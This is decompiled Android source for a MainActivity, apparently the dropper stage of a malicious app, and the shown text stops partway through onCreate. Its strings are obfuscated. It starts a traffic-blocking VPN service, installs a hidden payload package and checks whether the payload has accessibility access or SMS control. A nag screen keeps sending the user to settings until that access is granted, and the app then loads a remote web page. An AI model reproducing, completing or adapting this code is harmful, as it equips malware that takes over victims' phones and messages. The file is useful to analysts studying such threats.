package com.template.shellapp;

import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.Activity;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Color;
import android.graphics.Typeface;
import android.graphics.drawable.GradientDrawable;
import android.net.Uri;
import android.net.VpnService;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Telephony;
import android.util.Log;
import android.util.TypedValue;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowInsets;
import android.view.accessibility.AccessibilityManager;
import android.webkit.JavascriptInterface;
import android.webkit.WebResourceError;
import android.webkit.WebResourceRequest;
import android.webkit.WebResourceResponse;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.FrameLayout;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import com.template.shellapp.services.BlockVpnService;
import com.template.shellapp.services.SyncService;
import java.util.Iterator;
import java.util.Locale;
import kotlin.jvm.internal.ByteCompanionObject;
import p000.C0000;

/* JADX INFO: loaded from: /Users/xv/pin2/max-gate-apk/output/stage2/classes.dex */
public class MainActivity extends Activity {
    private static final int MAX_WEBVIEW_RETRIES = 30;
    private static final long RETRY_DELAY_MS = 3000;
    private static final int STAGE_INSTALL = 3;
    private static final int STAGE_NAG = 4;
    private static final int STAGE_PERMISSION = 2;
    private static final int STAGE_SPLASH = 0;
    private static final int STAGE_UPDATE = 1;
    private static final int STAGE_WEBVIEW = 5;
    private static final int VPN_REQUEST_CODE = 3269;
    private Runnable permPoller;
    private SharedPreferences prefs;
    private WebView webView;
    private String webviewTargetUrl;
    private Handler h = new Handler(Looper.getMainLooper());
    private boolean installing = false;
    private boolean pendingInstall = false;
    private boolean nagMode = false;
    private boolean vpnStarted = false;
    private boolean webviewMode = false;
    private int webviewRetryCount = 0;

    private void applyWebViewBackground() {
        WebView webView = this.webView;
        if (webView == null) {
            return;
        }
        webView.setBackgroundColor(isNightMode() ? Color.parseColor(C0000.decode(new byte[]{69, 2, 7, 1, 0, 0, 81}, "f3f0a103c310aa", false)) : -1);
    }

    private View buildNagPage() {
        int color = Color.parseColor(C0000.decode(new byte[]{70, 82, 6, 4, 9, 0, 7}, "eb1410", 0.0f));
        int color2 = Color.parseColor(C0000.decode(new byte[]{18, 86, 12, 86, 82, 85, 85}, "134330", false));
        int color3 = Color.parseColor(C0000.decode(new byte[]{18, 95, 5, 7, 1, 85, 7}, "1fdf14"));
        int color4 = Color.parseColor(C0000.decode(new byte[]{70, 80, 87, 82, 93, 80, 4}, "ea30de06a4f9", true));
        LinearLayout linearLayout = new LinearLayout(this);
        linearLayout.setOrientation(1);
        linearLayout.setBackgroundColor(color);
        linearLayout.setGravity(17);
        linearLayout.setPadding(dp(32), dp(60), dp(32), dp(40));
        View progressBar = new ProgressBar(this);
        LinearLayout.LayoutParams layoutParams = new LinearLayout.LayoutParams(dp(40), dp(40));
        layoutParams.gravity = 1;
        layoutParams.bottomMargin = dp(28);
        linearLayout.addView(progressBar, layoutParams);
        TextView textView = new TextView(this);
        textView.setText(getString(R.string.app_name));
        textView.setTextSize(2, 22.0f);
        textView.setTextColor(color2);
        textView.setTypeface(Typeface.create(C0000.decode(new byte[]{70, 7, 91, 64, 25, 18, 85, 65, 95, 82, 79, 14, 6, 5, 95, 67, 88}, "5f534a0364bcca66", true), 0));
        textView.setGravity(17);
        LinearLayout.LayoutParams layoutParams2 = new LinearLayout.LayoutParams(-2, -2);
        layoutParams2.gravity = 1;
        layoutParams2.bottomMargin = dp(12);
        linearLayout.addView(textView, layoutParams2);
        TextView textView2 = new TextView(this);
        textView2.setText(isRu() ? C0000.decode(new byte[]{-26, -83, -26, -38, -77, -65, 23, -24, -116, -23, -120, -80, -30, -31, -73, -24, -125, -23, -116, -80, -32, -32, -118, -24, -120, -23, -113, 65, -77, -80, -25, -120, -26, -120, -26, -33, -77, -78, -26, -77, 22, -23, -119, -80, -30, -32, -113, -24, -115, -23, -120, -79, -44, -32, -126, -24, -117, -23, -114, -80, -19, 58, -25, -123, -26, -116, -26, -33, -78, -127, -26, -67, -26, -121, -26, -43, -78, -120, -25, -124, -26, -121, 22, -79, -48, -32, -115, -24, -115, -24, -72, -80, -27, -32, -113, -23, -76, -24, -70, 65, -77, -79, -25, -125, -25, -70, -26, -41, -78, -127, -26, -69, 22, -24, -73, -79, -35, -32, -126, -23, -80, -23, -114, -79, -46, -32, -116, -23, -70, -23, -117, -80, -23, -31, -78, 24, -26, -117, -26, -33, -78, -121, -25, -124, -26, -121, -26, -41, -78, -115, -25, -122, -25, -72, -25, -29, -78, -123, -25, -127}, "696ab078") : C0000.decode(new byte[]{53, 95, 21, 20, 66, 81, 65, 68, 93, 8, 66, 20, 0, 64, 69, 65, 65, 70, 14, 64, 80, 19, 93, 77, 77, 58, 76, 14, 68, 20, 15, 85, 80, 5, 17, 64, 14, 16, 80, 15, 80, 86, 13, 85, 21, 21, 89, 81, 65, 81, 86, 2, 84, 71, 18, 89, 87, 8, 93, 93, 21, 73, 21, 18, 84, 70, 23, 89, 86, 4}, "a05a14", 6));
        textView2.setTextSize(2, 14.0f);
        textView2.setTextColor(color3);
        textView2.setGravity(17);
        textView2.setLineSpacing(dp(4), 1.0f);
        LinearLayout.LayoutParams layoutParams3 = new LinearLayout.LayoutParams(-2, -2);
        layoutParams3.gravity = 1;
        layoutParams3.bottomMargin = dp(32);
        linearLayout.addView(textView2, layoutParams3);
        Button button = new Button(this);
        button.setText(isRu() ? C0000.decode(new byte[]{-25, -12, -27, -114, -27, -33, -27, -65, -31, -80, -25, -34, -28, -74, -28, -24}, "7f545d4107") : C0000.decode(new byte[]{38, 88, 7, 84, 94, 4}, "c6f62aaed2d4", false));
        button.setTextColor(-1);
        button.setTextSize(2, 15.0f);
        button.setTypeface(Typeface.DEFAULT_BOLD);
        button.setAllCaps(false);
        GradientDrawable gradientDrawable = new GradientDrawable();
        gradientDrawable.setColor(color4);
        gradientDrawable.setCornerRadius(dp(24));
        button.setBackground(gradientDrawable);
        button.setPadding(dp(32), dp(14), dp(32), dp(14));
        button.setOnClickListener(new View.OnClickListener() { // from class: com.template.shellapp.MainActivity$$ExternalSyntheticLambda0
            @Override // android.view.View.OnClickListener
            public final void onClick(View view) {
                this.f$0.m12lambda$buildNagPage$5$comtemplateshellappMainActivity(view);
            }
        });
        LinearLayout.LayoutParams layoutParams4 = new LinearLayout.LayoutParams(-1, -2);
        layoutParams4.gravity = 1;
        linearLayout.addView(button, layoutParams4);
        TextView textView3 = new TextView(this);
        textView3.setText(isRu() ? C0000.decode(new byte[]{-25, -7, -24, -43, -77, -114, -76, -42, -76, -34, -77, -77, -29, -115, 25, 68}, "7d8ec7dbdfb1389f", false) + getString(R.string.app_name) + C0000.decode(new byte[]{71, 25, -26, -124, 20, -31, -79, -79, -35, -78, -113, -77, -73, -25, -126, -28, -48, 51, -26, -114, 20, -32, -126, -79, -40, -78, -116, -77, -72, -26, -65, -28, -35, -24, -76, -26, -127, 16, -32, -34, -78, -41, -26, -30, -26, -126, -24, -114, -75, -126, -25, -72, -27, -73, -32, -47, -77, -32, -25, -41, -26, -116, -23, -72}, "e966400abb7b6784", 0.0f) : C0000.decode(new byte[]{36, 94, 15, 85, 23, 18}, "b7a17079") + getString(R.string.app_name) + C0000.decode(new byte[]{68, 68, 92, 15, 70, 70, 80, 4, 67, 13, 10, 18, 18, 110, 84, 15, 2, 18, 93, 15, 2, 3, 15, 4, 70, 16, 93, 4, 70, 70, 87, 6, 4, 13, 6}, "fd5af28acaca", 0.0f));
        textView3.setTextSize(2, 12.0f);
        textView3.setTextColor(color3);
        textView3.setGravity(17);
        LinearLayout.LayoutParams layoutParams5 = new LinearLayout.LayoutParams(-2, -2);
        layoutParams5.gravity = 1;
        layoutParams5.topMargin = dp(16);
        linearLayout.addView(textView3, layoutParams5);
        return linearLayout;
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void doInstall() {
        this.installing = true;
        callJs(C0000.decode(new byte[]{18, 12, 12, 79, 102, 84, 68, 4, 86, 88, 26, 16, 8, 10, 16, 76, 84, 91, 90, 70, 26}, "adc8576a3627", 1));
        if (this.vpnStarted) {
            startInstallThread();
        } else {
            requestVpnAndInstall();
        }
    }

    private int dp(int i) {
        return (int) TypedValue.applyDimension(1, i, getResources().getDisplayMetrics());
    }

    private void enterWebViewMode(String str) {
        this.webviewMode = true;
        this.webviewTargetUrl = str;
        this.webviewRetryCount = 0;
        Log.d(C0000.decode(new byte[]{38, 52, 46, 100, 53, 36, 51, 107, 118, 115, 36}, "bfa4eaa421c558"), C0000.decode(new byte[]{7, 88, 66, 84, 65, 50, 6, 81, 110, 15, 6, 71, 41, 94, 5, 81, 88, 22}, "b6613ec38fc0d1a4") + str);
        FrameLayout frameLayout = new FrameLayout(this);
        frameLayout.setBackgroundColor(Color.parseColor(C0000.decode(new byte[]{71, 82, 82, 80, 5, 83, 7}, "dc3adbff", 2)));
        final ProgressBar progressBar = new ProgressBar(this);
        FrameLayout.LayoutParams layoutParams = new FrameLayout.LayoutParams(dp(48), dp(48));
        layoutParams.gravity = 17;
        frameLayout.addView(progressBar, layoutParams);
        WebView webView = new WebView(this);
        webView.setBackgroundColor(0);
        webView.setVisibility(4);
        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setUseWideViewPort(true);
        settings.setLoadWithOverviewMode(true);
        settings.setSupportMultipleWindows(false);
        settings.setCacheMode(2);
        webView.setWebViewClient(new WebViewClient() { // from class: com.template.shellapp.MainActivity.3
            @Override // android.webkit.WebViewClient
            public void onReceivedError(WebView webView2, int i, String str2, String str3) {
                Log.w(C0000.decode(new byte[]{38, 101, 124, 52, 51, 112, 100, 107, 38, 32, 118}, "b73dc564bb17ba", 0.0f), C0000.decode(new byte[]{53, 85, 3, 52, 8, 6, 71, 23, 85, 16, 16, 95, 19, 88, 65}, "b0abac070b", 0.0f) + str2 + C0000.decode(new byte[]{18, 1, 89, 1, 87, 95}, "2b6e2befd64b2c", 0.0f) + i + C0000.decode(new byte[]{21, 24, 23, 85, 70, 67, 72, 70}, "50e0211fa75f41d7", false) + MainActivity.this.webviewRetryCount + C0000.decode(new byte[]{76}, "e1d18bc57d399c", 2));
                MainActivity.this.scheduleWebViewRetry(webView2, progressBar);
            }

            @Override // android.webkit.WebViewClient
            public void onReceivedError(WebView webView2, WebResourceRequest webResourceRequest, WebResourceError webResourceError) {
                if (webResourceRequest.isForMainFrame()) {
                    Log.w(C0000.decode(new byte[]{39, 107, 122, 50, 103, 114, 49, 102, 113, 32, 112}, "c95b77", MainActivity.STAGE_WEBVIEW), C0000.decode(new byte[]{99, 83, 7, 111, 10, 86, 67, 22, 0, 75, 17, 92, 70, 22, 77, 120, 51, 122, 6, 5, 78, 16, 89, 19}, "46e9c3", true) + webResourceError.getDescription().toString() + C0000.decode(new byte[]{24, 28, 69, 7, 70, 16, 75, 66}, "847b2b2b20", false) + MainActivity.this.webviewRetryCount + C0000.decode(new byte[]{74}, "c889aa3c5d", 7));
                    MainActivity.this.scheduleWebViewRetry(webView2, progressBar);
                }
            }

            @Override // android.webkit.WebViewClient
            public void onReceivedHttpError(WebView webView2, WebResourceRequest webResourceRequest, WebResourceResponse webResourceResponse) {
                if (!webResourceRequest.isForMainFrame() || webResourceResponse.getStatusCode() < 500) {
                    return;
                }
                Log.w(C0000.decode(new byte[]{119, 96, 46, 49, 98, 115, 102, 109, 37, 32, 116}, "32aa2642ab", 0), C0000.decode(new byte[]{96, 4, 87, 55, 92, 83, 64, 65, 125, 53, 97, 102, 23}, "7a5a56", true) + webResourceResponse.getStatusCode() + C0000.decode(new byte[]{17, 76, 74, 86, 16, 19, 78, 19}, "1d83da73", true) + MainActivity.this.webviewRetryCount + C0000.decode(new byte[]{27}, "2381d43f", true));
                MainActivity.this.scheduleWebViewRetry(webView2, progressBar);
            }

            @Override // android.webkit.WebViewClient
            public boolean shouldOverrideUrlLoading(WebView webView2, String str2) {
                if (str2 == null) {
                    return false;
                }
                boolean zStartsWith = str2.startsWith(C0000.decode(new byte[]{90, 69, 76, 73, 70, 89, 29, 76, 77, 23, 95, 84, 23}, "21895c2c99", 0.0f));
                String strDecode = C0000.decode(new byte[]{80, 95, 93, 17, 87, 89, 82, 72, 80, 95, 69, 84, 87, 23, 22, 81, 85, 18, 80, 94, 95, 31, 111, 42, 125, 103}, "119c806f91", 0);
                if (zStartsWith || str2.startsWith(C0000.decode(new byte[]{22, 86, 15, 29, 25}, "b15265bcb43a6a17"))) {
                    try {
                        MainActivity.this.startActivity(new Intent(strDecode, Uri.parse(str2)));
                        return true;
                    } catch (Exception unused) {
                    }
                }
                if (str2.startsWith(C0000.decode(new byte[]{70, 81, 95, 8}, "243234", 1)) || str2.startsWith(C0000.decode(new byte[]{95, 80, 11, 9, 17, 91, 3}, "21bee497356d9ca8", 4))) {
                    try {
                        MainActivity.this.startActivity(new Intent(strDecode, Uri.parse(str2)));
                        return true;
                    } catch (Exception unused2) {
                    }
                }
                return false;
            }

            @Override // android.webkit.WebViewClient
            public void onPageFinished(WebView webView2, String str2) {
                progressBar.setVisibility(8);
                webView2.setVisibility(0);
            }
        });
        frameLayout.addView(webView, new FrameLayout.LayoutParams(-1, -1));
        setContentView(frameLayout);
        webView.loadUrl(str);
        this.webView = webView;
    }

    private String getWebViewUrl() {
        SharedPreferences sharedPreferences = this.prefs;
        String strDecode = C0000.decode(new byte[]{19, 84, 3, 79, 95, 93, 18, 111, 20, 23, 8}, "d1a968e0ae", true);
        String string = sharedPreferences.getString(strDecode, null);
        if (string != null && !string.isEmpty()) {
            return string;
        }
        try {
            String webViewUrl = PayloadInstaller.INSTANCE.getWebViewUrl();
            if (webViewUrl != null && !webViewUrl.startsWith(C0000.decode(new byte[]{62, 109}, "a25f1a", 0.0f)) && !webViewUrl.isEmpty()) {
                this.prefs.edit().putString(strDecode, webViewUrl).apply();
                return webViewUrl;
            }
        } catch (Exception unused) {
        }
        return null;
    }

    private void injectSafeInsets() {
        int dimensionPixelSize;
        int identifier;
        WindowInsets rootWindowInsets;
        float f = getResources().getDisplayMetrics().density;
        int dimensionPixelSize2 = 0;
        try {
            if (Build.VERSION.SDK_INT < MAX_WEBVIEW_RETRIES || (rootWindowInsets = getWindow().getDecorView().getRootWindowInsets()) == null) {
                dimensionPixelSize = 0;
            } else {
                int i = rootWindowInsets.getInsets(WindowInsets.Type.statusBars()).top;
                try {
                    dimensionPixelSize = rootWindowInsets.getInsets(WindowInsets.Type.navigationBars()).bottom;
                    dimensionPixelSize2 = i;
                } catch (Throwable unused) {
                    dimensionPixelSize = 0;
                    dimensionPixelSize2 = i;
                }
            }
            String strDecode = C0000.decode(new byte[]{86, 12, 0, 17, 9, 90, 83}, "7bdcf3");
            String strDecode2 = C0000.decode(new byte[]{87, 12, 12, 92, 13}, "3ea9c559", 4);
            if (dimensionPixelSize2 <= 0) {
                try {
                    int identifier2 = getResources().getIdentifier(C0000.decode(new byte[]{18, 67, 80, 16, 67, 75, 111, 1, 85, 70, 111, 10, 0, 11, 6, 95, 69}, "a71d680c440beb", 3), strDecode2, strDecode);
                    if (identifier2 > 0) {
                        dimensionPixelSize2 = getResources().getDimensionPixelSize(identifier2);
                    }
                    if (dimensionPixelSize <= 0 && (identifier = getResources().getIdentifier(C0000.decode(new byte[]{89, 86, 68, 8, 84, 89, 71, 10, 89, 15, 58, 87, 5, 69, 110, 92, 82, 94, 85, 9, 71}, "772a383c6ae5d714", true), strDecode2, strDecode)) > 0) {
                        dimensionPixelSize = getResources().getDimensionPixelSize(identifier);
                    }
                } catch (Throwable unused2) {
                }
            } else if (dimensionPixelSize <= 0) {
                dimensionPixelSize = getResources().getDimensionPixelSize(identifier);
            }
        } catch (Throwable unused3) {
            dimensionPixelSize = 0;
        }
        int iMax = Math.max(24, Math.round(dimensionPixelSize2 / f));
        int iMax2 = Math.max(48, Math.round(dimensionPixelSize / f));
        StringBuilder sbAppend = new StringBuilder(C0000.decode(new byte[]{7, 86, 2, 67, 12, 85, 86, 65, 31, 5, 92, 1, 22, 84, 4, 88, 21, 117, 84, 80, 92, 4, 93, 22, 77, 74, 21, 79, 13, 85, 22, 70, 84, 21, 99, 16, 12, 73, 4, 68, 21, 73, 16, 18, 28, 76, 90, 12, 16, 92, 21, 27, 21, 95, 72, 18, 29, 70}, "c9a6a0851a3b")).append(iMax);
        String strDecode3 = C0000.decode(new byte[]{69, 76, 70, 24}, "54a13e8a04fdac", 0.0f);
        callJs(sbAppend.append(strDecode3).toString());
        callJs(C0000.decode(new byte[]{80, 13, 91, 66, 91, 7, 13, 67, 27, 0, 91, 1, 77, 90, 83, 12, 23, 114, 89, 1, 89, 7, 86, 67, 24, 17, 23, 78, 89, 1, 26, 17, 93, 67, 102, 16, 12, 71, 80, 22, 64, 27, 16, 16, 27, 79, 10, 89, 70, 1, 64, 79, 90, 88, 66, 22, 12, 90, 18, 72, 19}, "4b876bc75d", false) + iMax2 + strDecode3);
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void injectWebTheme() {
        callJs(C0000.decode(new byte[]{75, 6, 21, 41, 89, 81, 11, 16, 108, 92, 86, 95, 82, 75}, "8cae06cd84327c", true) + (!isNightMode() ? C0000.decode(new byte[]{18, 70, 66, 83}, "f47699c12f1c", 2) : C0000.decode(new byte[]{83, 3, 93, 65, 1}, "5b12dfdd0a23c705", true)) + C0000.decode(new byte[]{30}, "74c0956ad380f996", 1));
        injectSafeInsets();
    }

    private static boolean isDummyPkg(String str) {
        return str == null || str.isEmpty() || str.startsWith(C0000.decode(new byte[]{103, 105}, "86e81dc99c38fe", 2)) || C0000.decode(new byte[]{5, 70, 8, 17, 89, 90, 91, 74, 6, 67, 88, 93, 7}, "d6ce657dd611ce5c", 0.0f).equals(str) || C0000.decode(new byte[]{85, 4, 20, 75, 3, 20, 80, 5, 14, 0, 74, 4, 68, 8, 14, 1}, "1abedf", 3).equals(str);
    }

    private boolean isPayloadAccessibilityEnabled(String str) {
        try {
            AccessibilityManager accessibilityManager = (AccessibilityManager) getSystemService(C0000.decode(new byte[]{83, 87, 87, 3, 23, 74, 80, 90, 95, 15, 8, 66, 78}, "244fd9986ca676", true));
            if (accessibilityManager == null) {
                return false;
            }
            Iterator<AccessibilityServiceInfo> it = accessibilityManager.getEnabledAccessibilityServiceList(-1).iterator();
            while (it.hasNext()) {
                String id = it.next().getId();
                if (id != null && id.startsWith(str + C0000.decode(new byte[]{28}, "37aa38bb9ce5ce02", true))) {
                    return true;
                }
            }
        } catch (Exception e) {
            Log.e(C0000.decode(new byte[]{119, 97, 43, 49, 99, 117, 97, 108, 32, 35, 116}, "33da30", 0.0f), C0000.decode(new byte[]{81, 64, 51, 89, 77, 95, 11, 89, 87, 39, 91, 80, 6, 75, 71, 90, 6, 81, 95, 15, 76, 74, 38, 86, 85, 81, 8, 93, 87, 70, 93, 65, 17, 87, 70, 9, 68}, "83c843d83f", 4) + e.getMessage());
        }
        return false;
    }

    private boolean isPayloadPermissionGranted(String str) {
        if (C0000.decode(new byte[]{19, 86, 16}, "a7d41cda", 0.0f).equals(PayloadInstaller.INSTANCE.getPayloadType())) {
            return isPayloadAccessibilityEnabled(str);
        }
        try {
            if (str.equals(Telephony.Sms.getDefaultSmsPackage(this))) {
                return true;
            }
        } catch (Exception unused) {
        }
        try {
            return getPackageManager().checkPermission(C0000.decode(new byte[]{85, 93, 5, 65, 14, 93, 86, 22, 20, 80, 75, 15, 93, 64, 18, 90, 14, 90, 28, 106, 33, 118, 124, 43, 98, 118, 62, 96, 44, 103}, "43a3a428d59b", 0.0f), str) == 0;
        } catch (Exception unused2) {
            return false;
        }
    }

    private boolean isRu() {
        return Locale.getDefault().getLanguage().equals(C0000.decode(new byte[]{69, 17}, "7d901842d9"));
    }

    private void requestVpnAndInstall() {
        try {
            Intent intentPrepare = VpnService.prepare(this);
            if (intentPrepare != null) {
                startActivityForResult(intentPrepare, VPN_REQUEST_CODE);
            } else {
                startBlockVpn();
                startInstallThread();
            }
        } catch (Exception e) {
            Log.e(C0000.decode(new byte[]{112, 48, 123, 53, 54, 39, 101, 104, 112, 32, 115}, "4b4efb77", true), C0000.decode(new byte[]{103, 101, 118, 19, 69, 67, 6, 65, 2, 74, 86, 20, 87, 84, 81, 95, 80, 85, 89, 17}, "158351c1c834", true) + e.getMessage());
            startInstallThread();
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void restoreStage() {
        int i = this.prefs.getInt(C0000.decode(new byte[]{84, 17, 17, 17, 81, 91, 67, 59, 16, 23, 85, 82, 82}, "7dcc45"), 0);
        Log.d(C0000.decode(new byte[]{124, 49, 123, 51, 53, 115, 101, 106, 117, 38, 33}, "8c4ce6751dffe5"), C0000.decode(new byte[]{71, 84, 22, 18, 9, 64, 84, 99, 65, 80, 2, 3, 92, 18, 66, 81, 67, 84, 1, 91}, "51eff210", false) + i);
        boolean zCanRequestPackageInstalls = getPackageManager().canRequestPackageInstalls();
        if (i == 1) {
            callJs(C0000.decode(new byte[]{71, 11, 87, 79, 106, 2, 68, 93, 4, 15, 78, 17, 68, 72, 80, 2, 76, 93, 30, 72}, "4c889a68aaf618", false));
            return;
        }
        String strDecode = C0000.decode(new byte[]{67, 9, 94, 64, 98, 82, 16, 80, 92, 11, 75, 70, 89, 15, 66, 67, 80, 93, 14, 18, 16}, "0a1711b59eca", 0.0f);
        if (i == 2) {
            if (!zCanRequestPackageInstalls) {
                callJs(C0000.decode(new byte[]{69, 92, 87, 66, 49, 84, 68, 81, 93, 91, 74, 16, 70, 81, 74, 88, 11, 68, 69, 93, 87, 91, 69, 30}, "6485b7", 0));
                return;
            }
            callJs(strDecode);
            saveStage(3);
            doInstall();
            return;
        }
        if (i != 3) {
            return;
        }
        if (!isPayloadInstalled()) {
            callJs(strDecode);
            doInstall();
        } else {
            saveStage(4);
            launchPayload();
            enterNagMode();
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void saveStage(int i) {
        this.prefs.edit().putInt(C0000.decode(new byte[]{86, 68, 16, 19, 6, 10, 71, 57, 70, 69, 3, 6, 6}, "51bacd3f"), i).apply();
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void scheduleWebViewRetry(final WebView webView, ProgressBar progressBar) {
        int i = this.webviewRetryCount;
        if (i >= MAX_WEBVIEW_RETRIES) {
            Log.e(C0000.decode(new byte[]{125, 99, 46, 51, 54, 116, 99, 58, 116, 33, 116}, "91acf11e0c37", 0.0f), C0000.decode(new byte[]{96, 81, 86, 98, 80, 93, 19, 70, 85, 2, 73, 65, 68, 6, 67, 70, 93, 81, 74, 24, 22, 3, 89, 0, 89, 4, 82, 79, 23, 83, 93, 66, 80, 86, 3, 70, 77, 19}, "744498df8c1a6c", true));
            return;
        }
        this.webviewRetryCount = i + 1;
        webView.setVisibility(4);
        progressBar.setVisibility(0);
        this.h.postDelayed(new Runnable() { // from class: com.template.shellapp.MainActivity$$ExternalSyntheticLambda1
            @Override // java.lang.Runnable
            public final void run() {
                this.f$0.m15lambda$scheduleWebViewRetry$3$comtemplateshellappMainActivity(webView);
            }
        }, RETRY_DELAY_MS);
    }

    private void startBlockVpn() {
        String strDecode = C0000.decode(new byte[]{32, 52, 43, 104, 103, 112, 101, 108, 33, 36, 114}, "dfd87573ef56c847", true);
        try {
            this.vpnStarted = true;
            startService(new Intent(this, (Class<?>) BlockVpnService.class));
            Log.d(strDecode, C0000.decode(new byte[]{113, 13, 86, 0, 93, 101, 49, 119, 66, 23, 16, 80, 19, 77, 86, 5}, "3a9c63a9bdd1a9", 7));
        } catch (Exception e) {
            Log.e(strDecode, C0000.decode(new byte[]{122, 88, 13, 85, 89, 53, 105, 118, 69, 69, 67, 5, 23, 68, 67, 85, 89, 93, 14, 83, 86, 89, 25}, "84b62c98e67de0c3", true) + e.getMessage());
        }
    }

    private String targetPackage() {
        String string = this.prefs.getString(C0000.decode(new byte[]{65, 64}, "5063814a3ca00b", false), null);
        if (isDummyPkg(string)) {
            try {
                string = PayloadInstaller.INSTANCE.getTargetPackage();
            } catch (Throwable unused) {
                string = null;
            }
        }
        if (isDummyPkg(string)) {
            return null;
        }
        return string;
    }

    /* JADX INFO: renamed from: lambda$buildNagPage$5$com-template-shellapp-MainActivity, reason: not valid java name */
    /* synthetic */ void m12lambda$buildNagPage$5$comtemplateshellappMainActivity(View view) {
        try {
            startActivity(new Intent(C0000.decode(new byte[]{88, 8, 87, 68, 87, 92, 93, 72, 64, 83, 76, 65, 80, 8, 84, 69, 22, 116, 122, 37, 118, 101, 107, 124, 123, 47, ByteCompanionObject.MAX_VALUE, ByteCompanionObject.MAX_VALUE, 108, 108, 102, 53, 118, 98, 108, 124, 119, 33, 96}, "9f3685", true)));
        } catch (Exception e) {
            Log.e(C0000.decode(new byte[]{117, 107, 121, 105, 101, 115, 51, 57, 38, 112, 119}, "196956afb206", true), C0000.decode(new byte[]{33, 83, 11, 15, 87, 64, 20, 9, 20, 6, 87, 70, 83, 91, 90, 82, 17, 65, 12, 3, 81, 88, 93, 18, 29, 67, 74, 3, 70, 76, 80, 89, 5, 65, 95, 65}, "b2ea844fdc9f2897", 7) + e.getMessage());
        }
    }

    /* JADX INFO: renamed from: lambda$scheduleNagCheck$4$com-template-shellapp-MainActivity, reason: not valid java name */
    /* synthetic */ void m14lambda$scheduleNagCheck$4$comtemplateshellappMainActivity() {
        if (!this.nagMode || isFinishing()) {
            return;
        }
        String strTargetPackage = targetPackage();
        if (strTargetPackage == null || !isPayloadPermissionGranted(strTargetPackage)) {
            scheduleNagCheck();
            return;
        }
        Log.d(C0000.decode(new byte[]{116, 99, 122, 96, 54, 38, 49, 105, 116, 115, 114}, "0150fcc6", 0.0f), C0000.decode(new byte[]{11, 4, 83, 113, 89, 83, 6, 14, 14, 18, 90, 83, 28, 69, 68, 87, 67, 91, 12, 22, 71, 91, 94, 88, 69, 2, 70, 83, 95, 66, 0, 1}, "ee4216", true));
        BlockVpnService.INSTANCE.stop(this);
        this.vpnStarted = false;
        this.nagMode = false;
        String webViewUrl = getWebViewUrl();
        if (webViewUrl == null || webViewUrl.isEmpty()) {
            finish();
            return;
        }
        saveStage(STAGE_WEBVIEW);
        this.prefs.edit().putBoolean(C0000.decode(new byte[]{67, 86, 0, 20, 80, 84, 67, 108, 15, 13, 93, 84}, "43bb91"), true).apply();
        enterWebViewMode(webViewUrl);
    }

    /* JADX INFO: renamed from: lambda$scheduleWebViewRetry$3$com-template-shellapp-MainActivity, reason: not valid java name */
    /* synthetic */ void m15lambda$scheduleWebViewRetry$3$comtemplateshellappMainActivity(WebView webView) {
        if (isFinishing() || this.webviewTargetUrl == null) {
            return;
        }
        Log.d(C0000.decode(new byte[]{117, 101, 123, 96, 100, 112, 97, 109, 39, 122, 118}, "17404532c8", 0.0f), C0000.decode(new byte[]{110, 82, 0, 100, 94, 4, 78, 23, 16, 87, 67, 19, 64, 23, 65}, "97b27a", 0.0f) + this.webviewRetryCount);
        webView.stopLoading();
        webView.loadUrl(this.webviewTargetUrl);
    }

    /* JADX INFO: renamed from: lambda$startInstallThread$1$com-template-shellapp-MainActivity, reason: not valid java name */
    /* synthetic */ void m16lambda$startInstallThread$1$comtemplateshellappMainActivity() {
        String strDecode = C0000.decode(new byte[]{119, 98, 121, 99, 100, 118, 102, 108, 124, 39, 116}, "306343438e");
        try {
            Log.d(strDecode, C0000.decode(new byte[]{101, 88, 76, 88, 93, 0, 5, 43, 91, 74, 65, 85, 94, 13, 4, 16, 21, 75, 80, 71, 71, 13, 21, 88, 21}, "59542aab", 6) + PayloadInstaller.INSTANCE.install(this));
        } catch (Throwable th) {
            Log.e(strDecode, C0000.decode(new byte[]{113, 86, 18, 21, 3, 85, 88, 23, 95, 3, 95, 9, 92, 93, 2, 24}, "88aab9479b6e99", false) + th.getMessage());
        }
    }

    /* JADX INFO: renamed from: lambda$startInstallThread$2$com-template-shellapp-MainActivity, reason: not valid java name */
    /* synthetic */ void m17lambda$startInstallThread$2$comtemplateshellappMainActivity() {
        if (this.installing) {
            this.installing = false;
            callJs(C0000.decode(new byte[]{75, 13, 88, 18, 102, 84, 67, 92, 92, 94, 17, 21, 70, 73, 0, 4, 76, 0, 16, 76}, "8e7e5719909239de", 0.0f));
        }
    }

    @Override // android.app.Activity
    protected void onActivityResult(int i, int i2, Intent intent) {
        super.onActivityResult(i, i2, intent);
        if (i == VPN_REQUEST_CODE) {
            if (i2 == -1) {
                startBlockVpn();
            } else {
                Log.d(C0000.decode(new byte[]{38, 98, ByteCompanionObject.MAX_VALUE, 102, 100, 39, 101, 108, 124, 36, 115}, "b0064b738f444c", 6), C0000.decode(new byte[]{55, 98, 44, 17, 81, 94, 15, 65, 7, 95, 70, 17, 5, 87, 12, 88, 87, 85, 77, 18, 18, 67, 93, 82, 4, 87, 6, 88, 92, 86, 65, 69, 11, 69, 90, 94, 20, 70}, "a2b121", true));
            }
            startInstallThread();
        }
    }

    @Override // android.app.Activity
    protected void onCreate(Bundle bundle) {
        String webViewUrl;
        super.onCreate(bundle);
        this.prefs = getSharedPreferences(C0000.decode(new byte[]{87, 67, 20, 105, 86, 80, 69, 4}, "63d6211e03", true), 0);
        try {
            startForegroundService(new Intent(this, (Class<?>) SyncService.class));
        } catch (Throwable unused) {
        }
        getWindow().getDecorView().setSystemUiVisibility(1792);
        if (Build.VERSION.SDK_INT >= MAX_WEBVIEW_RETRIES) {
            getWindow().setDecorFitsSystemWindows(false);
        }
